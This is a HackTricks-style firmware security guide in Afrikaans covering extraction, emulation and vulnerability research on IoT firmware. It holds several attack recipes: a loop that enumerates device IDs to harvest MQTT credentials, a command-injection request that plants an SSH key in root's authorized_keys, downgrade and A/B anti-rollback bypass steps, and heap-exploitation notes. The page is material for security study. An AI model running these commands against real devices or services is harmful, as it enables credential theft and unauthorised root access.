# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang het tot belangrike instruksies vanaf die oomblik wat dit aangeskakel word, wat tot die laai van die bedryfstelsel lei. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap in die identifisering van sekuriteitskwesbaarhede.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Die insameling van inligting** is ’n kritieke aanvanklike stap om ’n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit loop
- Bootloader-besonderhede
- Hardeware-uitleg en datasheets
- Kodebasis-metrieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsassesserings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-tools van onskatbare waarde, net soos die ontleding van enige beskikbare open-source sagtewarekomponente deur middel van handmatige en geoutomatiseerde hersieningsprosesse. Tools soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om potensiële probleme te vind.

## **Die verkryging van die Firmware**

Firmware kan op verskeie maniere verkry word, elk met sy eie vlak van kompleksiteit:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- **Bou** dit vanaf verskafde instruksies
- **Laai dit af** vanaf amptelike ondersteuningswebwerwe
- Gebruik **Google dork**-navrae om gehuisvesde firmware-lêers te vind
- Kry direk toegang tot **cloud storage**, met tools soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Onderskep **opdaterings** deur man-in-the-middle-tegnieke
- **Ekstraheer** dit vanaf die toestel deur verbindings soos **UART**, **JTAG**, of **PICit**
- **Sniff** vir opdateringsversoeke binne toestelkommunikasie
- Identifiseer en gebruik **hardcoded update endpoints**
- **Dump** dit vanaf die bootloader of netwerk
- **Verwyder en lees** die stoorskyfie wanneer alles anders misluk, deur toepaslike hardewaretools te gebruik

### UART-only logs: force a root shell via U-Boot env in flash

As UART RX geïgnoreer word (slegs logs), kan jy steeds ’n init shell forseer deur die **U-Boot environment blob** offline te **edit**:<sup>[[6]](#references)</sup>

1. Dump SPI flash met ’n SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Vind die U-Boot env-partisie, edit `bootargs` om `init=/bin/sh` in te sluit, en **recompute die U-Boot env CRC32** vir die blob.
3. Reflash slegs die env-partisie en reboot; ’n shell behoort op UART te verskyn.

Dit is nuttig op embedded toestelle waar die bootloader shell gedeaktiveer is, maar die env-partisie deur eksterne flash-toegang geskryf kan word.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor ekstraheer om te weet hoe om dit te hanteer. Verskillende tools wat jy daarvoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie tools vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`. As die entropie laag is, is dit waarskynlik nie encrypted nie. As die entropie hoog is, is dit waarskynlik encrypted (of op een of ander manier compressed).

Verder kan jy hierdie tools gebruik om **lêers wat binne die firmware ingebed is** te extract:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspect.

### Verkryging van die Filesystem

Met die vorige tools, soos `binwalk -ev <bin>`, behoort jy die **filesystem te kon extract**.\
Binwalk extract dit gewoonlik binne ’n **folder wat na die filesystem-tipe vernoem is**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige Filesystem-Extraction

Soms sal binwalk **nie die magic byte van die filesystem in sy signatures hê nie**. Gebruik in hierdie gevalle binwalk om die **offset van die filesystem te vind en die compressed filesystem** uit die binary te **carve**, en **extract** dan die filesystem handmatig volgens sy tipe deur die stappe hieronder te gebruik.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit om die Squashfs-lêerstelsel te carve.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (wat in die voorbeeld hierbo gebruik word)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ontleding van Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te dissekteer om die struktuur en potensiële kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie tools om die firmware te ontleed en waardevolle data uit die firmwarebeeld te onttrek.

### Aanvanklike Analise-tools

'n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help met die identifisering van lêertipes, die onttrekking van strings, die ontleding van binêre data, en die begrip van die partisie- en lêerstelselbesonderhede:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te bepaal, word die **entropie** nagegaan met `binwalk -E <bin>`. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word tools en hulpbronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die Lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels die gebruik van `binwalk` om die lêerstelsel se offset te bepaal, gevolg deur die `dd`-opdrag om die lêerstelsel uit te carve:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna word, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs), verskillende commands gebruik om die inhoud handmatig te onttrek.

### Lêerstelsel-analise

Met die lêerstelsel onttrek, begin die soektog na sekuriteitskwesbaarhede. Aandag word gegee aan onveilige netwerkdaemons, hardcoded credentials, API endpoints, update-serverfunksionaliteit, ongecompileerde code, startup-scripts en compiled binaries vir offline-analise.

**Belangrike liggings** en **items** om te ondersoek, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikerscredentials
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en scriptlêers vir moontlike kwesbaarhede
- Embedded binaries vir verdere analise
- Algemene IoT-toestel-webservers en binaries

Verskeie tools help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir soektogte na sensitiewe inligting
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-analise
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese analise

### Sekuriteitskontroles op Compiled Binaries

Beide broncode en compiled binaries wat in die lêerstelsel gevind word, moet deeglik vir kwesbaarhede ondersoek word. Tools soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Insameling van cloud-config en MQTT-credentials via afgeleide URL-tokens

Baie IoT-hubs haal hul per-toestel-konfigurasie van ’n cloud-endpoint af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-analise kan jy vind dat `<token>` plaaslik van die toestel-ID afgelei word deur ’n hardcoded secret te gebruik, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) en as uppercase hex voorgestel

Hierdie ontwerp stel enigeen wat ’n deviceId en die STATIC_KEY leer, in staat om die URL te rekonstrueer en cloud-config af te laai, wat dikwels plaintext MQTT-credentials en topic-prefixes onthul.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-bootlogs

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en versamel logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Soek na lyne wat die cloud config-URL-patroon en broker-adres uitdruk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek die config path ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Bereken die token in Bash en skakel die digest na hoofletters om:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Versamel cloud config en MQTT credentials

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om secrets te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics in te teken en soek na sensitiewe gebeurtenisse:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme bevat vendor OUI/product/type-grepe, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iterateer, tokens aflei en konfigurasies programmaties ophaal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Verkry altyd eksplisiete magtiging voordat mass enumeration uitgevoer word.
- Verkies emulasie of static analysis om secrets te herwin sonder om die teikenhardeware te wysig waar moontlik.


Die proses om firmware te emuleer maak **dynamic analysis** moontlik van óf ’n toestel se werking óf ’n individuele program. Hierdie benadering kan uitdagings met hardware- of architecture-afhanklikhede teëkom, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ’n ooreenstemmende architecture en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere testing fasiliteer.

### Emulasie van Individuele Binaries

Vir die ondersoek van enkele programme is dit noodsaaklik om die program se endianness en CPU architecture te identifiseer.

#### Voorbeeld met MIPS Architecture

Om ’n binary met ’n MIPS architecture te emuleer, kan die volgende command gebruik word:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasienutsmiddels te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sou `qemu-mipsel` die keuse wees.

#### ARM Architecture Emulation

Vir ARM binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulation gebruik word.

### Full System Emulation

Tools soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander, maak volledige firmware-emulation moontlik, outomatiseer die proses en help met dynamic analysis.

## Dynamic Analysis in Practice

Op hierdie stadium word óf ’n werklike óf ’n geëmuleerde device-omgewing vir analysis gebruik. Dit is noodsaaklik om shell access tot die OS en filesystem te behou. Emulation boots moontlik nie hardware interactions perfek na nie, wat soms die herbegin van emulation vereis. Analysis moet die filesystem weer ondersoek, exposed webpages en network services exploit, en bootloader-vulnerabilities ondersoek. Firmware integrity tests is krities om potensiële backdoor-vulnerabilities te identifiseer.

## Runtime Analysis Techniques

Runtime analysis behels interaksie met ’n process of binary in sy operating environment, met tools soos gdb-multiarch, Frida en Ghidra om breakpoints te stel en vulnerabilities deur fuzzing en ander techniques te identifiseer.

Vir embedded targets sonder ’n volledige debugger, **copy a statically-linked `gdbserver`** na die device en attach remotely:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio MCU** en ’n Linux-userlandproses verdeel. ’n Nuttige workflow is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF frame** in die lug
2. **controller-side parser** op die radio MCU
3. **serial/UART text or TLV protocol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **application dispatcher** in die hoofdemon
5. **protocol-specific handler / state machine**

Hierdie argitektuur skep twee reversing-teikens in plaas van een. As die controller binêre radio frames na ’n tekstuele protokol soos `Group,Command,arg1,arg2,...` omskakel, herwin:

- Die **message groups** en dispatch-tabelle
- Watter boodskappe van die **network** versus die controller self kan kom
- Die presiese **manufacturer-specific discriminator fields** (byvoorbeeld Zigbee `manufacturer_code` en custom `cluster_command`)
- Watter handlers slegs tydens **commissioning**, discovery, of firmware/model-downloadfases bereikbaar is

Vir Zigbee spesifiek, neem pairing-verkeer vas en kyk of die teiken steeds op die verstek **Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan sniffing van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-install codes verminder hierdie blootstelling, dus let op of die getoetste toestel dit werklik afdwing.

### Manufacturer-specific protocol handlers en FSM-gated reachability

Vendor-specific Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters omdat hulle **custom parsing code** en interne **FSMs** voed met minder battle-tested validation.<sup>[[8]](#references)</sup>

Praktiese workflow:

- Reverse die command dispatcher totdat jy die **vendor-only handler** vind.
- Herwin die **FSM state**, **event**, **check**, **action**, en **next-state**-tabelle.
- Identifiseer **transitional states** wat outomaties voortgaan, asook retry/error-takke wat uiteindelik attacker-controlled state reset of free.
- Bevestig watter wettige protocol exchanges nodig is om die daemon in die kwesbare toestand te plaas, in plaas daarvan om aan te neem dat die buggy handler altyd bereikbaar is.

Vir timing-sensitive protocols kan packet replay vanaf ’n Python-framework te stadig wees. ’n Meer betroubare benadering is om ’n wettige toestel op werklike hardware (byvoorbeeld ’n **nRF52840**) te emuleer met ’n vendor-grade stack sodat jy die korrekte **endpoints**, **attributes**, en commissioning-timing kan blootlê.

### Fragmented-download-bugklas in embedded daemons

’n Herhalende firmware-bugklas kom voor in **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. Die **first fragment** (`offset == 0`) stoor `ctx->total_size` en allokeer `malloc(total_size)`.
2. Latere fragments valideer slegs die attacker-controlled **packet-local** fields, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om dit teen die **original allocated size** te kontroleer.

Dit stel ’n attacker in staat om:

- ’n Eerste geldige fragment met ’n **small** declared total size te stuur om ’n klein heap-allokasie af te dwing.
- ’n Latere fragment met die **expected offset**, maar ’n groter `chunk_len`, te stuur.
- ’n Forged packet-local size te stuur wat aan die vars checks voldoen terwyl dit steeds die oorspronklik geallokeerde buffer overflow.

Wanneer die kwesbare pad agter commissioning logic sit, moet exploitation genoeg **device emulation** insluit om die teiken in die verwagte model-download- of blob-download-toestand te dryf voordat die malformed fragments gestuur word.

### Protocol-driven `free()`-triggers

In embedded daemons is die maklikste manier om heap metadata exploitation te trigger dikwels nie om “vir cleanup te wag” nie, maar om die protokol se eie **error handling** af te dwing:<sup>[[8]](#references)</sup>

- Stuur malformed follow-up fragments om die FSM in **retry**- of **error**-toestande te druk.
- Oorskry die retry threshold sodat die daemon **context reset** en die corrupted buffer free.
- Gebruik hierdie voorspelbare `free()` om allocator-side primitives te trigger voordat die proses om onverwante redes crash.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-like** allocators in embedded Linux, waar die korrupsie van chunk metadata unlink/unbin-logic in ’n write primitive kan omskep. ’n Stabiele patroon is om ’n **size field** te korrupteer om allocator traversal na **fake chunks staged inside the overflowed buffer** te herlei, eerder as om onmiddellik werklike bin pointers te oorskryf en die proses te laat crash.

## Binary Exploitation en Proof-of-Concept

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diep begrip van die teikenargitektuur en programming in lower-level languages. Binary runtime protections in embedded systems is skaars, maar wanneer dit teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot allokasie kan `__malloc_consolidate()` trigger, dus moet enige fake chunk checks oorleef (sane size, `fd = 0`, en omliggende chunks wat as “in use” gesien word).<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** indien ASLR geaktiveer is, maar die hoofbinêre lêer **non-PIE** is, is in-binary `.data/.bss`-adresse stabiel. Jy kan ’n area teiken wat reeds soos ’n geldige heap chunk header lyk om ’n fastbin-allokasie op ’n **function pointer table** te laat land.
- **Parser-stopping NUL:** wanneer JSON geparse word, kan ’n `\x00` in die payload parsing stop terwyl dit trailing attacker-controlled bytes vir ’n stack pivot/ROP chain behou.
- **Shellcode via `/proc/self/mem`:** ’n ROP chain wat `open("/proc/self/mem")`, `lseek()`, en `write()` call, kan executable shellcode in ’n bekende mapping plaas en daarnaar spring.

## Voorbereide Operating Systems vir Firmware Analysis

Operating systems soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) verskaf voorafgekonfigureerde omgewings vir firmware security testing, toegerus met die nodige tools.

## Voorbereide OSs om Firmware te analiseer

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met security assessment en penetration testing van Internet of Things (IoT)-toestelle. Dit spaar jou baie tyd deur ’n voorafgekonfigureerde omgewing met al die nodige gelaaide tools te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04, vooraf gelaai met firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selfs wanneer ’n vendor cryptographic signature checks vir firmware images implementeer, word **version rollback (downgrade) protection gereeld weggelaat**. Wanneer die boot- of recovery-loader slegs die signature met ’n ingebedde public key verifieer, maar nie die *version* (of ’n monotonic counter) van die image wat geflash word vergelyk nie, kan ’n attacker wettiglik ’n **ouer, kwesbare firmware wat steeds ’n geldige signature dra** installeer en sodoende gepatchte kwesbaarhede herinstel.<sup>[[4]](#references)</sup>

Tipiese aanval-workflow:

1. **Obtain an older signed image**
* Kry dit vanaf die vendor se openbare download portal, CDN of support site.
* Ekstraheer dit uit companion mobile/desktop applications (byvoorbeeld binne ’n Android APK onder `assets/firmware/`).
* Kry dit uit third-party repositories soos VirusTotal, Internet archives, forums, ens.
2. **Upload or serve the image to the device** via enige blootgestelde update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, ens.
* Baie consumer IoT devices stel *unauthenticated* HTTP(S)-endpoints bloot wat Base64-encoded firmware blobs aanvaar, dit server-side decodeer en recovery/upgrade trigger.
3. Na die downgrade, exploit ’n kwesbaarheid wat in die nuwer release gepatch is (byvoorbeeld ’n command-injection filter wat later bygevoeg is).
4. Flash opsioneel die nuutste image terug of disable updates om detection te vermy sodra persistence verkry is.

### Voorbeeld: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (afgeskaalde) firmware word die `md5`-parameter direk in ’n shell command saamgevoeg sonder sanitisering, wat die inspuiting van arbitrêre commands moontlik maak (hier – om SSH-sleutelgebaseerde root-toegang te aktiveer). Latere firmware-weergawes het ’n basiese karakterfilter bekendgestel, maar die afwesigheid van downgrade-beskerming maak die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van Firmware uit Mobile Apps

Baie vendors bundel volledige firmware-beelde binne hul companion mobile applications sodat die app die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word algemeen ongeënkripteer in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Tools soos `apktool`, `ghidra`, of selfs gewone `unzip` laat jou toe om signed images te onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Anti-rollback-bypass slegs in updater in A/B-slotontwerpe

Sommige vendors implementeer wel ’n anti-downgrade **ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n recovery-opdrag, of ’n userspace OTA-agent). Indien die **bootloader** later slegs die image se signature/CRC nagaan en die partition table of slot-metadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat beide ’n weergawebeskrywing en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in persistente storage gestoor word en verwerp ouer signed images.
- Die bootloader **parse** nie daardie ratchet nie en verifieer slegs header, CRC en signature voordat dit die gekose slot boot.
- Slot-aktivering word afsonderlik in ’n partition table of per-slot generation counter gestoor en is nie kriptografies gebind aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **validate-one-image / boot-another-image**-primitive in dual-slot-stelsels. Indien die aanvaller die updater kan laat merk dat slot B die volgende boot-teiken is deur ’n huidige signed image te gebruik, en slot B later voor reboot kan oorskryf, kan die bootloader steeds die downgraded image boot omdat dit slegs die reeds-gecommitteerde slot-metadata vertrou.

Algemene misbruikpatroon:

1. Upload ’n **current signed** firmware na die passiewe slot en voer die normale validation/switch-roetine uit sodat die layout daardie slot as volgende aktief merk.
2. **Moet nog nie reboot nie**. Gaan weer die slot-preparation/erase-roetine binne in dieselfde sessie.
3. Misbruik stale boot-state- of stale slot-selection-logika sodat die updater die **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer maar steeds signed** firmware na daardie slot.
5. Slaan die validation-roetine wat die ratchet afdwing oor en reboot direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs signature/integrity, en boot die ou image.

Dinge waarna jy moet kyk wanneer jy A/B-update-implementerings reverse:

- Slotkeuse wat afgelei word van **boot-time flags** wat nie na ’n suksesvolle switch verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitvee gebaseer op stale state eerder as die **huidige gecommitteerde layout**.
- ’n `part_write_layout()`-agtige funksie wat slegs ’n **generation counter** / active flag verhoog en nie die gevalideerde image hash stoor nie.
- Ratchet checks wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM / bootloader / secure boot-stadia nie.
- Erase- of recovery-roetines wat die slot as bootable gemerk laat selfs nadat die inhoud verwyder en herskryf is.

### Kontrolelys vir die assessering van update-logika

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die device **version numbers** of ’n **monotone anti-rollback counter** voordat dit flash?
* Word die image binne ’n secure boot chain geverifieer (bv. signatures wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet** as die updater af, eerder as om slegs signature/CRC na te gaan?
* Is slot-aktiveringsmetadata **gebind aan die gevalideerde firmware-digest/weergawe**, of kan ’n slot ná promotion gewysig word?
* Word die device ná ’n suksesvolle slot-switch gedwing om te reboot, of is latere update/erase-roetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode addisionele sanity checks uit (bv. toegelate partition map, modelnommer)?
* Hergebruik *partial* of *backup* update-flows dieselfde validation-logika?

> 💡  Indien enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om te oefen met die ontdekking van kwesbaarhede in firmware, gebruik die volgende kwesbare firmware-projekte as ’n beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-decryption keys uit ingebedde KMS/Vault-state

Wanneer ’n update image klein plaintext-metadata met ’n groot high-entropy blob kombineer, doen container triage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Dump headers, offsets en lyngrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 bytes is die salt en die oorblywende bytes is ciphertext.
- ’n Base64-veld wat na presies `256` bytes decodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmware-wagwoord/session key omvou.
- Detached PGP-materiaal in dieselfde file beskerm dikwels slegs authenticity; moenie aanvaar dat dit die confidentiality-meganisme is nie.

Indien statiese key hunting (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse eerder die **operasionele decrypt path** as om slegs na private keys te soek:

- Decompile die updater / management binary en trace wie die encrypted blob lees, watter helper/API dit unwrap, en die logiese key name waarvoor dit vra.
- Soek in die geëkstraheerde root filesystem vir KMS-state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook unit files en init scripts.
- Behandel plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens of plaaslike KMS auto-unseal scripts as ekwivalent aan private-key-materiaal.

Indien die appliance die oorspronklike Vault-binary en storage backend verskaf, is dit gewoonlik makliker om daardie environment te replay as om Vault-internals te herimplementeer:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
